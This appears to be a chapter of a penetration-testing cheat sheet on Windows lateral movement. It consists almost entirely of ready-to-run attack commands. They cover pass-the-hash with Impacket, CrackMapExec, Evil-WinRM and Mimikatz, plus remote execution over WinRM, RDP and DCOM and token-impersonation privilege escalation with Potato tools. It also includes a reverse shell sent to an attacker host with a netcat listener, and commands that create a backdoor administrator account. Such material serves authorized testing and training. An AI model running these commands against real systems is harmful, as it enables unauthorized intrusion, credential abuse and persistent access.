# 07 — Lateral Movement Techniques

[← Back to index](README.md)

## 7.1 Pass-the-Hash (PtH)

```bash
# Impacket PSExec (gets SYSTEM shell)
impacket-psexec $DOMAIN/$USER@$TARGET_IP -hashes ':$HASH'
impacket-psexec $DOMAIN/Administrator@$TARGET_IP -hashes ':ADMIN_HASH'

# Impacket SMBExec (less noisy — no service binary dropped)
impacket-smbexec $DOMAIN/$USER@$TARGET_IP -hashes ':$HASH'

# Impacket WMIExec (semi-interactive)
impacket-wmiexec $DOMAIN/$USER@$TARGET_IP -hashes ':$HASH'
impacket-wmiexec $DOMAIN/$USER@$TARGET_IP -hashes ':$HASH' -shell-type powershell

# Impacket ATExec (single command via Task Scheduler)
impacket-atexec $DOMAIN/$USER@$TARGET_IP -hashes ':$HASH' 'whoami'

# CrackMapExec PtH
crackmapexec smb $TARGET_IP -u $USER -H $HASH -x 'whoami'
crackmapexec smb 10.10.10.0/24 -u Administrator -H ADMIN_HASH -x 'net user'

# Evil-WinRM (requires WinRM/5985 open)
evil-winrm -i $TARGET_IP -u $USER -H $HASH

# CME WinRM PtH
crackmapexec winrm $TARGET_IP -u $USER -H $HASH
```

```powershell
# Mimikatz sekurlsa::pth (Windows)
.\Mimikatz.exe 'sekurlsa::pth /user:$USER /domain:$DOMAIN /ntlm:$HASH /run:cmd.exe' exit
```

## 7.2 Remote Execution Methods

| Method | Protocol/Port | Tool | Privileges Required |
|--------|---------------|------|---------------------|
| PsExec-style | SMB 445 | impacket-psexec, smbexec | Local Admin (writes service) |
| WMI | RPC 135/445 | impacket-wmiexec, CME | Local Admin |
| WinRM | HTTP 5985/S | evil-winrm, CME | WinRM users group / Admin |
| RDP | TCP 3389 | xfreerdp, remmina | Remote Desktop Users / Admin |
| DCOM | RPC 135 | impacket-dcomexec | Local Admin |
| AT/Scheduled Task | SMB 445/RPC | impacket-atexec, CME | Local Admin |
| PsRemoting | WinRM 5985 | PowerShell, evil-winrm | WinRM enabled |
| SSH | TCP 22 | ssh, plink | SSH user (if enabled) |

### WinRM / Evil-WinRM

```bash
# Check WinRM availability
crackmapexec winrm 10.10.10.0/24 -u $USER -p $PASS

# Connect with password
evil-winrm -i $TARGET_IP -u $USER -p $PASS

# Connect with hash
evil-winrm -i $TARGET_IP -u $USER -H $HASH

# Connect with Kerberos ticket
evil-winrm -i $TARGET_IP -r $DOMAIN -u $USER   # (with valid ticket in KRB5CCNAME)

# Load PowerShell scripts directly
evil-winrm -i $TARGET_IP -u $USER -p $PASS -s /path/to/scripts/ -e /path/to/exe/
```

```bash
# Upload/download files (inside evil-winrm session)
upload /local/path/file.exe C:\Temp\file.exe
download C:\Temp\file.txt /local/path/
# Inside session: Invoke-Mimikatz (if loaded)
```

```bash
# Upload RunasCs.exe
PS C:\programdata> .\RunasCs.exe $Runas_USER $PASS powershell.exe -r $ATTACKER_IP:9001

rlwarp nc -lvnp 9001
```

### RDP Lateral Movement

```bash
# Connect with password
xfreerdp /v:$TARGET_IP /u:$USER /p:$PASS /cert:ignore
xfreerdp /v:$TARGET_IP /u:$USER /p:$PASS /cert:ignore /drive:kali,/tmp/share

# Restricted Admin mode (PtH over RDP)
xfreerdp /v:$TARGET_IP /u:$USER /pth:$HASH /cert:ignore
```

```powershell
# Enable restricted admin via registry (if you have access)
reg add 'HKLM\System\CurrentControlSet\Control\Lsa' /v DisableRestrictedAdmin /t REG_DWORD /d 0

# Multi-hop RDP (add RDP user)
net user hacker Pass123! /add
net localgroup 'Remote Desktop Users' hacker /add
```

### DCOM Lateral Movement

```bash
# Impacket DCOM exec
impacket-dcomexec $DOMAIN/$USER:$PASS@$TARGET_IP 'whoami'
impacket-dcomexec $DOMAIN/$USER@$TARGET_IP -hashes ':$HASH' 'whoami'
```

```powershell
# PowerShell DCOM
$com = [activator]::CreateInstance([type]::GetTypeFromProgID('MMC20.Application', '$TARGET_IP'))
$com.Document.ActiveView.ExecuteShellCommand('cmd.exe', $null, '/c calc.exe', '7')

# Other DCOM objects:
# MMC20.Application (above)
# ShellWindows
# ShellBrowserWindow
```

## 7.3 Token Impersonation & Local Privilege Escalation

```powershell
# List available tokens (Incognito / Mimikatz)
.\Mimikatz.exe 'token::list' exit

# Incognito (inside Meterpreter):
# use incognito; list_tokens -u; impersonate_token 'CORP\\DA_user'

# Impersonate token
.\Mimikatz.exe 'token::elevate /domainadmin' exit

# PrintSpoofer (SeImpersonatePrivilege → SYSTEM)
.\PrintSpoofer.exe -i -c cmd.exe

# GodPotato (Universal Potato — Windows 10/11, Server 2016-2022)
.\GodPotato.exe -cmd 'cmd /c whoami'
.\GodPotato.exe -cmd 'cmd /c net user hacker Pass123! /add && net localgroup administrators hacker /add'

# JuicyPotatoNG (SeImpersonatePrivilege → SYSTEM)
.\JuicyPotatoNG.exe -t * -p cmd.exe -a '/c whoami'

# Check for SeImpersonatePrivilege
whoami /priv
# Look for: SeImpersonatePrivilege, SeAssignPrimaryTokenPrivilege
```

---

[← Prev: 06 — ACL / DACL Abuse](06-acl-dacl-abuse.md) | [Next: 08 — Domain Privilege Escalation →](08-domain-privilege-escalation.md)
